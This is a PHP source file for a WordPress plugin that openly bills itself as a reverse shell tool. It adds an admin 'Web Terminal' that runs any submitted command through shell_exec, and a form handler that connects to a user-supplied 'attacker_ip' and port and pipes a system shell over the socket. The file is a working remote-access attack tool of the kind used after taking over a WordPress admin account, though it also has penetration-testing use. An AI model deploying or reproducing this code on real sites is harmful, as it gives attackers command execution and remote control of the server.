<?php

/*
 * Plugin Name:       Reverse Shell WordPress Plugin
 * Plugin URI:        https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin
 * Description:       A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection to a specified IP address and port.
 * Version:           2.0.0
 * Author:            4m3rr0r
 * License:           MIT License
 * License URI:       https://raw.githubusercontent.com/4m3rr0r/Reverse-Shell-WordPress-Plugin/refs/heads/main/LICENSE
 */


if (!defined('ABSPATH')) exit;

add_action('admin_menu', function () {

$svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
  <path d="M12 4c4.418 0 8 3.358 8 7.5c0 1.901 -.755 3.637 -2 4.96l0 2.54a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1v-2.54c-1.245 -1.322 -2 -3.058 -2 -4.96c0 -4.142 3.582 -7.5 8 -7.5z"/>
  <path d="M10 17v3"/>
  <path d="M14 17v3"/>
  <path d="M9 11a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"/>
  <path d="M15 11a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"/>
</svg>';

$icon = 'data:image/svg+xml;base64,' . base64_encode($svg);

    add_menu_page(
        'RSWP Panel',
        'RSWP',
        'manage_options',
        'rswp-dashboard',
        'rswp_dashboard_page',
        $icon,
        100
    );

    add_submenu_page('rswp-dashboard', 'Dashboard', 'Dashboard', 'manage_options', 'rswp-dashboard', 'rswp_dashboard_page');
    add_submenu_page('rswp-dashboard', 'Web Terminal', 'Web Terminal', 'manage_options', 'rswp-web', 'rswp_web_page');
    add_submenu_page('rswp-dashboard', 'Reverse Shell', 'Reverse Shell', 'manage_options', 'rswp-reverse', 'rswp_reverse_page');
});


/**
 * LOAD ASSETS
 */
add_action('admin_enqueue_scripts', function($hook) {

    if (strpos($hook, 'rswp') === false) return;

    $base = plugin_dir_url(__FILE__);

    wp_enqueue_style('rswp-bootstrap', $base . 'assets/css/bootstrap.min.css');
    wp_enqueue_style('rswp-custom', $base . 'assets/css/custom.css');

    wp_enqueue_script('rswp-bootstrap', $base . 'assets/js/bootstrap.bundle.min.js', [], false, true);
    
});

/**
 * PAGE LOADERS
 */
function rswp_dashboard_page() {
    include plugin_dir_path(__FILE__) . 'pages/dashboard.php';
}

function rswp_web_page() {
    include plugin_dir_path(__FILE__) . 'pages/web.php';
}

function rswp_reverse_page() {
    include plugin_dir_path(__FILE__) . 'pages/reverse.php';
}


/**
 * WEB CONSOLE ENGINE (AJAX)
 */

add_action('wp_ajax_rswp_web_exec', 'rswp_handle_web_exec');

function rswp_handle_web_exec() {
    check_ajax_referer('rswp_web_nonce', 'security');

    if (!current_user_can('manage_options')) {
        wp_die('Unauthorized');
    }

    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    $output = shell_exec($cmd . " 2>&1"); 

    echo htmlspecialchars($output);
    wp_die();
}

/**
 * FORM HANDLING: REVERSE SHELL INITIATION
 */
add_action('admin_post_rswp_init_socket', function() {
    if (!current_user_can('manage_options')) {
        wp_die('Unauthorized access.');
    }

    $ip = isset($_POST['attacker_ip']) ? sanitize_text_field($_POST['attacker_ip']) : '';
    $port = isset($_POST['attacker_port']) ? intval($_POST['attacker_port']) : 0;

    if (!empty($ip) && $port > 0) {
        rswp_execute_reverse_shell($ip, $port);
    }

    wp_redirect(admin_url('admin.php?page=rswp-reverse'));
    exit;
});

/**
 * CORE ENGINE: DUAL-PIPE REVERSE SHELL
 */
function rswp_execute_reverse_shell($ip, $port) {
    @set_time_limit(0);
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) return;

    $shell = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'cmd.exe' : '/bin/sh';
    
    $descriptors = [
        0 => ["pipe", "r"], 
        1 => ["pipe", "w"], 
        2 => ["pipe", "w"]
    ];

    $process = proc_open($shell, $descriptors, $pipes);

    if (is_resource($process)) {
        stream_set_blocking($sock, 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);

        while (!feof($sock) && proc_get_status($process)['running']) {
            $read = [$sock, $pipes[1], $pipes[2]];
            $write = $except = null;
            
            if (stream_select($read, $write, $except, 0, 100000) > 0) {
                if (in_array($sock, $read)) fwrite($pipes[0], fread($sock, 2048));
                if (in_array($pipes[1], $read)) fwrite($sock, fread($pipes[1], 2048));
                if (in_array($pipes[2], $read)) fwrite($sock, fread($pipes[2], 2048));
            }
        }
        
        foreach($pipes as $p) fclose($p);
        proc_close($process);
    }
    fclose($sock);
}